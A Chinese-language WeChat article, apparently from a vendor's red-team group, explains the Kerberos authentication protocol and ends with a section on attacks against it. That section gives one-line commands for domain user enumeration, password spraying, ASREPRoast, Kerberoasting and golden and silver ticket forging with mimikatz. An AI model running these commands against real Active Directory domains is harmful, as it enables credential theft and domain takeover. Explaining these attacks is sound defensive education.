##  关于 Kerberos 每个人都应该知道这些

原创 M01N  [ M01N Team ](javascript:void\(0\);)

**M01N Team** ![]()

微信号 m01nteam

功能介绍 攻击对抗研究分享

____

__

收录于话题

#AD安全

1个

**01** Kerberos 要干什么

Kerberos 是一个用于验证用户或主机身份的身份验证协议，Kerberos
协议在开放和不安全的网络上提供一种可靠的认证，但需要网络中的主机本身是可信的，即可信主机在不可信网络上的认证，微软 Kerberos 协议的实现遵循 RFC
的标准

  

 **设计目的**

• 用户密码不在网络上传输

• 用户密码不在任何客户端存储，使用完应立即销毁

• 用户密码不应该明文存储在服务器

• 集中认证，应用服务器不知道用户认证信息，集中认证可以让管理员在一个地方统一管理用户

• 支持双向认证，客户端也可以认证服务端

• 认证完成后，客户端和服务端必须可以加密传输数据

  

 **02  **一些概念

 **Realm**

表示一个用户或服务属于一个范围，Realm 是大小写敏感的，一般是大写的域名

  

 **Principal  **

即主体，一个主体关联到具体的一个用户、主机、服务

一般的形式是 Name[/Instance]@REALM

• 用户主体

pippo@EXAMPLE.COM admin/admin@EXAMPLE.COM pluto/admin@EXAMPLE.COM

Kerberos 4 中用 . 代替 /

• 服务主体

Service/Hostname@REALM imap/mbox.example.com@EXAMPLE.COM
afs/example.com@EXAMPLE.COM

  

 **加密**

• 加密方式

Kerberos 4 用 56 位的 DES 加密，Kerberos 5 协商决定

• 加密密钥

用户密钥和盐生成 hash 作为密钥，盐是用户主体名称如 pippo@EXAMPLE.COM ，保证不同 Realm 的用户有不同的密钥

这种密钥生成方式只针对用户，服务无需密钥生成

Kerberos 4 没有使用盐

  

 **KDC**

三部分组成

• database，保存用户和服务的认证信息

• Authentication Server (AS)，生成 TGT

• Ticket Granting Server (TGS)，生成 ST

  

 **Authenticator**

防止恶意攻击者抓取到 ticket 后重放 ticket，客户必须用 SessionKey 加密一个包含 Client 主体名和时间戳的，用来证明
Client 确实知道 SessionKey（要知道 SessionKey 必须通过认证），服务还会判断时间戳是否在一个时间段内，比如 2 分钟

  

 **Replay Cache  **

存在恶意攻击者同时抓取到 ticket 和 Authenticator，并且在两分钟内使用。为了防止这种情况，Kerberos5 引入了 Replay
Cache，服务会缓存 2 分钟内收到 Authenticator，如果判断收到 Authenticator 和缓存中的相同，则拒绝

  

 **Credential Cache  **

为了用户可以在整个过程中只输入一次密码以实现 SSO，Client 需要缓存 ticket 和对应的
SessionKey，一般缓存在只能由内核访问且不允许交换保存在硬盘的内存中

  

 **Ticket  **

包含认证信息，票据过期时间等

Client: Application Client 应用客户端

SS: Service Server 用户所请求的服务(TGS, smtp, ftp, ssh, AFS, lpr, ...)

  

  

 **03  **Kerberos 认证流程

![](https://gitee.com/fuli009/images/raw/master/public/20210805095042.png)

 **Authentication Server Request (AS_REQ)**

Client 发送 Client 主体名、SS 主体名、IP_list、Lifetime 给 KDC 的 AS

• Client 主体名说明自己是谁

• SS 主体名说明要访问的服务是谁，获取 TGT 时设置为 krbtgt/REALM@REALM

• IP_list 说明获取的 ticket 可以被哪些机器使用，为 null 表示获可以被任何机器使用（在 net 网络环境中一个主机可能有多个 IP）

• Lifetime 获取的 ticket 的最大有效时间

  

 **Authentication Server Reply (AS_REP)**

AS 收到 AS_REQ 的请求后，检查 Client 和 SS 是否存在，不存在则报错(这里可以爆破用户)

如果存在，则随机生成一个 SessionKey，并返回两部分内容

1\. Client 密钥加密的 SS 主体名、Timestamp 、Lifetime、SessionKey

2\. TGT 即 SS 密钥加密的 Client 主体名、 krbtgt/REALM@REALM
、IP_list、Timestamp、Lifetime、SessionKey

  

在这个阶段，Client 收到 AS_REP 后，获取到 TGT 并且如果正确解密 Client 密钥加密的数据则获取到SessionKey

Client 缓存 TGT 和 SessionKey

  

如果 Client 可以正确解密并获取到 SessionKey 说明用户和 KDC 都是真实的

  

这里 KDC 并没有验证用户是否可以通过认证，而是根据用户是否可以解密数据时判断是否可以通过认证，这样的好处是用户的密钥完全不经过网络传输，坏处是获取
TGT 太简单，虽然不合法的用户获取到了 TGT 也无法解密出 SessionKey 来加密一个合法的 Authenticator
来进行下一步的认证，但可以通过TGT 来爆破 client 用户的密钥

  

所以微软的 KDC 配置了预认证，在获取 TGT 时需要 Client 发送 NTLM hash 加密时间戳，KDC
解密时间戳来验证用户密码是否正确，这样的优点是获取 TGT 必须要有一个合法的用户，坏处是用户密码的HASH 在网上传输了

  

 **Ticket Granting Server Request (TGS_REQ)**

Client 正确解密出 SessionKey 后，用 SessionKey 加密一个 Authenticator

Authenticator 包括 Client 主体名、Timestamp

Client 发送 SS 主体名、Lifetime、Authenticator 和 TGT 给 TGS

  

 **Ticket Granting Server Replay (TGS_REP)**

TGS 收到 TGS_REQ 的请求后，首先验证 SS 主体名是否存在

如果存在，则用 krbtgt/REAM@REALM 解密 TGT 并获取其中的 SessionKey，解密 Authenticator 后验证

• TGT 是否过期

• Authenticator 中的 Client 主体名和 TGT 中的是否相同

• Authenticator 不在重放缓存（Replay Cache）中，并且没有过期

• IP_list 不为 null 时 TGS_REQ 请求的 IP 是否在 IP_list 中

  

验证通过后

TGS 随机生成一个新的 SessionKey，并返回两部分内容

1\. 旧的 SessionKey 加密的 SS 主体名、Timestamp 、Lifetime、新SessionKey

2\. ST 即 SS 密钥加密的 Client 主体名、SS 主体名、IP_list、Timestamp、Lifetime、新SessionKey

  

 **Application Request (AP_REQ)**

AP_REQ 没有标准，应用使用 ST 和 SessionKey 给服务器证明身份

Client 正确解密出新SessionKey 后，用新 SessionKey 加密一个 Authenticator

Authenticator 包括 Client 主体名、Timestamp

Client Authenticator 和 ST 给 SS

  

 **Application Replay (AP_REP)**

SS 收到 AP_REQ 请求后执行和 TGS_REP 一样的验证操作

TGS_REQ/TGS_REP 和 AP_REQ/AP_REP 的操作非常相似，多出 TGS_REQ/TGS_REP
是为了用户只需输入一次密码即可访问多个服务，如果只需访问一个服务，可以简化掉 TGS_REQ/TGS_REP 这个过程

  

  

 **04  **Kerberos 相关的攻击方式

 **域用户枚举**

在没有域内用户的情况下，通过 AS_REP 对用户存在和不存在返回的不同，枚举域内用户

nmap --script krb5-enum-users

  

 **Password Spray  **

域用户一般都有账户锁定机制，爆破密码容易锁定账号。因此可以使用固定密码，去尝试所有的域账号

DomainPasswordSpray 会自动获取用户列表，并尝试登录

Invoke-DomainPasswordSpray -Password Spring2017

  

 **ASREPRoast**

如果没有启用预认证，则在AS_REP 中可以获取到用户 HASH 加密的数据，基于这点可以离线爆破用户hash

Rubeus 可以寻找没有启用预认证的用户并获取 hash 加密的数据

Rubeus.exe asreproast /format:hashcat /outfile:hash.txt

hashcat64.exe -m 18200 hash.txt pass.txt --force

  

 **Kerberoasting  **

在微软 Kerberos 协议实现中，任何经过认证的域用户可以获取服务票据。服务票据通过服务账户
hash加密，而服务账户一种是关联到机器账户，一种是关联到域用户账户。机器账户密码复杂爆破难度高，通常寻找域用户账户关联的服务来进行爆破

  

使用 Empire 中的 Invoke-Kerberoast 可以自动获取域用户账户关联服务的SPN并获取票据

Invoke-kerberoast –outputformat hashcat | fl

  

使用 hashcat 破解票据

hashcat64.exe –m 13100 hash.txt pass.txt –force

  

 **over-pass-the-hash  **

获取到用户的 hash 后，利用用户 hash 和 kerberos 协议认证系统，与 pass-the-hash 不同之处在于，pass-the-hash
是用用户 hash 和 NTLM 协议认证系统

  

利用方式和 pass-the-hash 的相同

  

 **黄金票据  **

在知道 krbtgt 用户 hash 后，可以制作黄金票据，不在向 KDC 申请

利用 mimikatz 生成黄金票据

kerberos::purge

kerberos::golden /admin:administrator /domain:college.com
/sid:S-1-5-21-3792756393-3386897061-2081858749 /krbtgt:4c

  

 **白银票据**

在知道服务用户 hash 后，可以制作白银票据，不在向 KDC 申请利用 mimikatz 生成黄金票据

kerberos::golden /user:username /id:1106 /domain:domainname
/sid:S-1-5-21-1473643419-774954089-2222329127 /target:s

  

参考

https://www.kerberos.org/software/tutorial.html

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805095043.png)

 **绿盟科技M01N战队** 专注于Red
Team、APT等高级攻击技术、战术及威胁研究，涉及Web安全、终端安全、AD安全、云安全等相关领域。通过研判现网攻击技术发展方向，以攻促防，为风险识别及威胁对抗提供决策支撑，全面提升安全防护能力。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805095044.png)

 **M01N Team**

聚焦高级攻防对抗热点技术

绿盟科技蓝军技术研究战队

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

文章已于修改

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

关于 Kerberos 每个人都应该知道这些

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

